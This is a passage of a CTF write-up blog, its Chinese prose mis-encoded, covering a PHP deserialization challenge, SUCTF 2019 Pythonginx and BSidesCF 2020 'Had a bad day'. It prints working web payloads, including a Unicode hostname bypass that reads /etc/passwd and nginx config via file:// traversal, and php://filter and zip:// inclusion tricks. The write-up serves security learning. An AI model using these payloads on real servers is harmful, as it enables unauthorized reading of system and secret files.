</span></span></code></pre></td></tr></table></div></div><p>â­å‚è€ƒäº†å…¶ä»–çš„å¥½å¤šåšå®¢ï¼Œè¿™é‡Œçš„ç‚¹è®²çš„å¾ˆæ¨¡ç³Šï¼ŒåŸæ¥é•¿åº¦ä¸º5çš„å­—ç¬¦ä¸²å˜æˆäº†é•¿åº¦ä¸º6çš„ï¼Œåº”è¯¥æ˜¯æ›´ä¸å¯èƒ½è¯»ä¸åˆ°payloadçš„ã€‚</p><p>å—åˆ°äº†è¿™ä½å¸ˆå‚…çš„åšå®¢<a class=link href=https://blog.csdn.net/weixin_44077544/article/details/102703489 target=_blank rel=noopener>[0CTF 2016]piapiapia</a>ï¼Œæˆ‘å°è¯•äº†ä¸‹<code>$profile</code>å±æ€§å…¶å®æ˜¯ä¸€ä¸ª<strong>å…³è”æ•°ç»„</strong>ï¼Œæ˜¯é”®å€¼å¯¹å½¢å¼çš„ï¼Œå¹¶ä¸”å­—ç¬¦ä¸²å¯èƒ½æ˜¯åµŒå¥—èµ·æ¥çš„ï¼Œå½¢å¦‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>profile</span><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=nv>$file</span> <span class=o>=</span> <span class=s1>&#39;a:2:{s:8:&#34;nickname&#34;;s:5:&#34;where&#34;;s:5:&#34;photo&#34;;s:3:&#34;233&#34;;}&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=nv>$upload</span> <span class=o>=</span><span class=s2>&#34;2333&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$s1</span><span class=o>=</span> <span class=k>new</span> <span class=nx>profile</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$s1</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>ç»“æœæ˜¯</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>O</span><span class=o>:</span><span class=mi>7</span><span class=o>:</span><span class=s2>&#34;profile&#34;</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;file&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>56</span><span class=o>:</span><span class=s2>&#34;a:2:{s:8:&#34;</span><span class=nx>nickname</span><span class=s2>&#34;;s:15:&#34;</span><span class=nx>where</span><span class=s2>&#34;;s:5:&#34;</span><span class=nx>photo</span><span class=s2>&#34;;s:3:&#34;</span><span class=mi>233</span><span class=s2>&#34;;}&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>6</span><span class=o>:</span><span class=s2>&#34;upload&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;2333&#34;</span><span class=p>;}</span>
</span></span></code></pre></td></tr></table></div></div><p>è¿™ç§æ ¼å¼çš„ï¼Œå‡å¦‚æˆ‘ä»¬çš„payloadæ˜¯ä¿®æ”¹ä¸Šé¢çš„uploadï¼Œåœ¨ä¸€ä¸ªå­—ç¬¦ä¸²æ€»é•¿åº¦så¦‚ä¸Šé¢çš„56è¯»å–æ‰€æœ‰å˜é•¿çš„hackerä»¥åï¼Œåˆ°äº†æˆ‘ä»¬çš„payloadåœ°æ–¹ï¼Œæ­£å¸¸æŠŠæˆ‘ä»¬æ„é€ çš„uploadè¯»å–ä¸ºå¯¹è±¡ï¼Œè€Œåé¢çœŸæ­£çš„uploadå­—ç¬¦ä¸²å°±è¢«èˆå»äº†ã€‚</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310103923.png loading=lazy></p><p>æŠ¥é”™æ˜¯å› ä¸ºnicknameæˆ‘ä»¬ä¼ å…¥çš„æ˜¯æ•°ç»„å½¢å¼çš„ï¼Œæºä»£ç é‡Œç›´æ¥å¯¹æ•°ç»„è¿›è¡Œæ“ä½œè‚¯å®šæ˜¯æŠ¥é”™çš„ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦çš„åªæœ‰photoæ­£å¸¸å³å¯ï¼Œå¯ä»¥çœ‹åˆ°åé¢æˆ‘ä»¬æ–‡ä»¶æ›´æ–°æˆåŠŸäº†ã€‚</p><p>æŸ¥çœ‹é¡µé¢çš„å›¾ç‰‡å†…å®¹</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310103720.png loading=lazy></p><p>base64è§£ç </p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310103747.png loading=lazy></p><hr><h1 id=suctf-2019pythonginx>[SUCTF 2019]Pythonginx</h1><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310100334.png loading=lazy></p><p>æ•´ç†ä¸€ä¸‹æºç </p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>getUrl</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;url&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>host</span> <span class=o>=</span> <span class=n>parse</span><span class=o>.</span><span class=n>urlparse</span><span class=p>(</span><span class=n>url</span><span class=p>)</span><span class=o>.</span><span class=n>hostname</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>host</span> <span class=o>==</span> <span class=s1>&#39;suctf.cc&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;æˆ‘æ‰Œ your problem? 111&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>parts</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>urlsplit</span><span class=p>(</span><span class=n>url</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>host</span> <span class=o>=</span> <span class=n>parts</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>host</span> <span class=o>==</span> <span class=s1>&#39;suctf.cc&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;æˆ‘æ‰Œ your problem? 222 &#34;</span> <span class=o>+</span> <span class=n>host</span>
</span></span><span class=line><span class=cl>    <span class=n>newhost</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>h</span> <span class=ow>in</span> <span class=n>host</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;.&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>newhost</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>h</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;idna&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>parts</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;.&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>newhost</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1>#å»æ‰ url ä¸­çš„ç©ºæ ¼</span>
</span></span><span class=line><span class=cl>    <span class=n>finalUrl</span> <span class=o>=</span> <span class=n>urlunsplit</span><span class=p>(</span><span class=n>parts</span><span class=p>)</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>host</span> <span class=o>=</span> <span class=n>parse</span><span class=o>.</span><span class=n>urlparse</span><span class=p>(</span><span class=n>finalUrl</span><span class=p>)</span><span class=o>.</span><span class=n>hostname</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>host</span> <span class=o>==</span> <span class=s1>&#39;suctf.cc&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>urlopen</span><span class=p>(</span><span class=n>finalUrl</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;æˆ‘æ‰Œ your problem? 333&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>ä¸‰ä¸ªiféƒ½æ˜¯åˆ¤æ–­<code>host == 'suctf.cc'</code>ï¼Œä½†æ˜¯éœ€è¦æœ€åä¸€ä¸ªhoståˆ¤æ–­æˆåŠŸæ‰å¯ä»¥è¯»å–æ–‡ä»¶ï¼Œè¯»å–æ–‡ä»¶åº”è¯¥ä½¿ç”¨çš„æ˜¯phpä¼ªåè®®ï¼Œä½†æ˜¯å‰é¢çš„ä¸ä¼šäº†ï¼Œå»çœ‹wpã€‚å¤§æ¦‚çœ‹çš„æ„æ€è¿˜æ˜¯ç”¨unicodeæ¬ºéª—ï¼Œç›¸å…³é¢˜ç›®[[ASIS 2019]Unicorn shop](#[ASIS 2019]Unicorn shop)ï¼Œä½¿ç”¨unicodeç»è¿‡è§£æä»¥åè¿˜æ˜¯åŸæ¥çš„å­—ç¬¦ï¼Œä½†æ˜¯å¯ä»¥ç»•è¿‡åˆ¤æ–­<code>==</code>ï¼Œå›è¿‡å¤´æ¥æ³¨æ„åˆ°äº†<strong>ç¬¬äºŒä¸ª</strong>ifä¸­æœ‰<code>newhost.append(h.encode('idna').decode('utf-8'))</code>è¿›è¡Œäº†ä¸€æ³¢ç¼–ç ï¼Œé‚£ä¹ˆé—®é¢˜å°±å‡ºåœ¨äº†è¿™é‡Œã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ‰¾å‡ºéšä¾¿ä¸€ä¸ªhosté‡Œå­—ç¬¦çš„å…¶ä»–unicodeå€¼ï¼Œè¿™ä¸ªå€¼åœ¨ç»è¿‡ç¼–ç ä»¥åè¿˜å¯ä»¥å˜æˆåŸæ¥çš„å­—æ¯ã€‚å…¶ä»–wpéƒ½æ‰¾çš„æ˜¯æœ€åçš„å­—æ¯<code>c</code>ï¼Œé‚£ä¹ˆæˆ‘å°±æ‰¾ç¬¬ä¸€ä¸ªå­—æ¯<code>s</code>éªŒè¯ä¸€ä¸‹ï¼Œè´´ä¸€ä¸ªunicodeçš„ç½‘ç«™ï¼šhttps://www.compart.com/en/unicode/U+0073ï¼Œè¿›å…¥ç½‘ç«™ä»¥åå¯ä»¥æœç´¢ï¼Œç„¶åä¸‹é¢æœ‰ç›¸å…³çš„å­—ç¬¦ï¼Œ<strong>éœ€è¦å¤šè¯•å‡ ä¸ª</strong>ã€‚</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310102326.png loading=lazy></p><p>æˆ‘é€‰å‡ºçš„æ˜¯è¿™ä¸ªå­—ç¬¦<code>ğ¬</code>ï¼Œæˆ‘ä»¬å…ˆä½¿ç”¨urlç¼–ç ä¸€ä¸‹é˜²æ­¢å‚æ•°å‡ºç°é”™è¯¯ï¼Œå°è¯•è¯»ä¸€ä¸‹passwdï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../etc/passwd
</span></span></code></pre></td></tr></table></div></div><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310102513.png loading=lazy></p><p>flagå¹¶ä¸åœ¨å…¶ä¸­ï¼Œå¹¶ä¸”ä¹Ÿä¸å†æ ¹ç›®å½•ä¸‹ï¼Œæ ¹æ®é¢˜ç›®ä¸­æœ‰<code>nginx</code>åº”è¯¥æ˜¯ä¸€ä¸ªæŒ‡è·¯çš„ï¼Œå»è¯»ä¸€è¯»nginxçš„é…ç½®æ–‡ä»¶ã€‚ä»å¸ˆå‚…é‚£å­¦åˆ°çš„nginxé…ç½®æ–‡ä»¶æ‰€åœ¨ä½ç½®ï¼Œä»¥åè¯´ä¸å®šè‡ªå·±ä¹Ÿç”¨å¾—åˆ°ï¼š</p><blockquote><p>é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š/etc/nginxã€/usr/local/nginx/conf/nginx.conf</p><p>ä¸»é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf/nginx.conf</p><p>ç®¡ç†è„šæœ¬ï¼š/usr/lib64/systemd/system/nginx.service</p><p>æ¨¡å—ï¼š/usr/lisb64/nginx/modules</p><p>åº”ç”¨ç¨‹åºï¼š/usr/sbin/nginx</p><p>ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š/usr/share/nginx/html</p><p>æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/nginx</p></blockquote><p>è¯»é…ç½®æ–‡ä»¶</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../usr/local/nginx/conf/nginx.conf
</span></span></code></pre></td></tr></table></div></div><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310103257.png loading=lazy></p><p>è¯»flag</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../usr/fffffflag
</span></span></code></pre></td></tr></table></div></div><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310103323.png loading=lazy></p><p>å‚è€ƒçš„åšå®¢é“¾æ¥ï¼š</p><p><a class=link href=https://www.xmsec.cc/suctf19-wp/ target=_blank rel=noopener>https://www.xmsec.cc/suctf19-wp/</a></p><p><a class=link href=https://xz.aliyun.com/t/6042#toc-24 target=_blank rel=noopener>https://xz.aliyun.com/t/6042#toc-24</a></p><p><a class=link href=https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf target=_blank rel=noopener>https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p><hr><h1 id=bsidescf-2020had-a-bad-day>[BSidesCF 2020]Had a bad day</h1><p>çœ‹è¿™ä¸ªæ ‡é¢˜æˆ‘æ¨ä¸€ä¸‹OWRLD ORDERçš„<a class=link href=https://www.bilibili.com/video/BV1Bb411K7Gd target=_blank rel=noopener>Have a nice day</a></p><p>é¡µé¢ä¸¤ä¸ªæŒ‰é’®ï¼Œä¸€ä¸ªåº·ç‹—ç‹—ç…§ç‰‡ï¼Œä¸€ä¸ªåº·çŒ«çŒ«ç…§ç‰‡ï¼Œç‚¹æŒ‰é’®ä»¥åurlå°±ä¼šæ”¹å˜ä¸º</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/index.php?category=woofers
</span></span></code></pre></td></tr></table></div></div><p>å°è¯•è¾“å…¥flagä¼šæ˜¾ç¤º</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310175019.png loading=lazy></p><p>åªèƒ½æœ‰<code>woofers</code>å’Œ<code>meowers</code>å¯ä»¥é€šè¿‡ï¼Œå°è¯•äº†ä¸‹phpçš„<code>filter</code>ä¼ªåè®®è¯»æ–‡ä»¶</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310175611.png loading=lazy></p><p>è¯»å‡ºæ¥äº†ï¼Œä½†æ˜¯è§£å¯†ä»¥åç‹—ç‹—å’ŒçŒ«çŒ«è¿™ä¸¤ä¸ªç½‘é¡µæ²¡å•¥ä½œç”¨ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>center</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>	<span class=p>&lt;</span><span class=nt>h4</span><span class=p>&gt;</span> Woof! Woof! <span class=p>&lt;/</span><span class=nt>h4</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>center</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;width:100%&#34;</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;img/dog/&lt;?php echo rand(1,10)?&gt;.jpg&#34;</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>å¤šå°è¯•ä»¥åå‘ç°å¯ä»¥è¯»<code>index</code>ï¼Œä¸‹é¢æ˜¯ä¸»è¦çš„æºç ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$file</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;category&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$file</span><span class=p>)){</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span> <span class=nx>strpos</span><span class=p>(</span> <span class=nv>$file</span><span class=p>,</span> <span class=s2>&#34;woofers&#34;</span> <span class=p>)</span> <span class=o>!==</span>  <span class=k>false</span> <span class=o>||</span> <span class=nx>strpos</span><span class=p>(</span> <span class=nv>$file</span><span class=p>,</span> <span class=s2>&#34;meowers&#34;</span> <span class=p>)</span> <span class=o>!==</span>  <span class=k>false</span> <span class=o>||</span> <span class=nx>strpos</span><span class=p>(</span> <span class=nv>$file</span><span class=p>,</span> <span class=s2>&#34;index&#34;</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>						<span class=k>include</span> <span class=p>(</span><span class=nv>$file</span> <span class=o>.</span> <span class=s1>&#39;.php&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>					<span class=p>}</span>
</span></span><span class=line><span class=cl>					<span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>						<span class=k>echo</span> <span class=s2>&#34;Sorry, we currently only support woofers and meowers.&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>					<span class=p>}</span>
</span></span><span class=line><span class=cl>				<span class=p>}</span>
</span></span><span class=line><span class=cl>				<span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>å¯ä»¥çœ‹åˆ°ifåˆ¤æ–­ä¸­éœ€è¦å­—ç¬¦ä¸²åŒ…å«<code>woofers</code>ã€<code>meowers</code>ã€<code>index</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦åœ¨filterä¼ªåè®®ä¸­æ’å…¥å­—ç¬¦ä¸²ç»•è¿‡åˆ¤æ–­å³å¯ã€‚</p><p><strong>éœ€è¦çŸ¥é“çš„</strong>ï¼šfilterå¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦<code>\</code>åˆ†éš”ï¼Œæ‰€ä»¥æ„é€ payloadï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/index.php?category=php://filter/meowers/convert.base64-encode/resource=flag
</span></span></code></pre></td></tr></table></div></div><p>è¯»å‡ºæ¥ä»¥åè§£å¯†å³å¯è·å¾—flag</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310181106.png loading=lazy></p><p>æœç´¢çš„æ—¶å€™å­¦åˆ°äº†ä¸€ä¸ªå…¶ä»–çš„æˆªæ–­</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>zip://test.zip#hello.html.php
</span></span></code></pre></td></tr></table></div></div><p>ä»£è¡¨å½“å‰ç›®å½•ä¸‹çš„test.zipå‹ç¼©åŒ…é‡Œé¢çš„hello.html.phpï¼Œäºæ˜¯åŒ…å«æˆåŠŸã€‚</p></section><footer class=article-footer><section class=article-tags><a href=/tags/web/>Web</a>
<a href=/tags/buuctf_web/>BUUCTF_Web</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>ç›¸å…³æ–‡ç« </h2><div class=related-content><div class="flex article-list--tile"><article><a href=/articles/2021/08/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/><div class=article-details><h2 class=article-title>CISCNçº¿ä¸Šèµ›åº“å­˜</h2></div></a></article><article><a href=/articles/2020/12/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-rce-me/><div class=article-details><h2 class=article-title>æå®¢å¤§æŒ‘æˆ˜ 2019 RCE ME</h2></div></a></article><article><a href=/articles/2020/12/gxyctf2019-ping-ping-ping/><div class=article-details><h2 class=article-title>GXYCTF2019 Ping Ping Ping</h2></div></a></article><article><a href=/articles/2020/11/hackgame2020%E4%B8%80/><div class=article-details><h2 class=article-title>Hackgame2020(ä¸€)</h2></div></a></article><article><a href=/articles/2021/04/readlezphpeasysearch/><div class=article-details><h2 class=article-title>ReadlezPHP&amp;EasySearch</h2></div></a></article></div></div></aside><script src=//cdn.jsdelivr.net/npm/twikoo@1.6.39/dist/twikoo.all.min.js></script><div id=tcomment></div><style>.twikoo{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}:root[data-scheme=dark]{--twikoo-body-text-color-main:rgba(255, 255, 255, 0.9);--twikoo-body-text-color:rgba(255, 255, 255, 0.7)}.twikoo .el-input-group__prepend,.twikoo .tk-action-icon,.twikoo .tk-submit-action-icon,.twikoo .tk-time,.twikoo .tk-comments-no,.twikoo .tk-comments-count{color:var(--twikoo-body-text-color)}.twikoo .el-input__inner,.twikoo .el-textarea__inner,.twikoo .tk-preview-container,.twikoo .tk-content,.twikoo .tk-nick,.twikoo .tk-send{color:var(--twikoo-body-text-color-main)}.twikoo .el-button{color:var(--twikoo-body-text-color)!important}.twikoo .el-input__count{color:var(--twikoo-body-text-color)!important}.OwO .OwO-body{background-color:var(--body-background)!important;color:var(--body-text-color)!important}</style><script>twikoo.init({envId:"https://twikoo.braindance.top/.netlify/functions/twikoo",el:"#tcomment"})</script><footer class=site-footer><section class=copyright>&copy;
2020 -
2025 Braindance</section><section class=powerby>ä½¿ç”¨ <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> æ„å»º<br>ä¸»é¢˜ <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.31.0>Stack</a></b> ç”± <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> è®¾è®¡</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>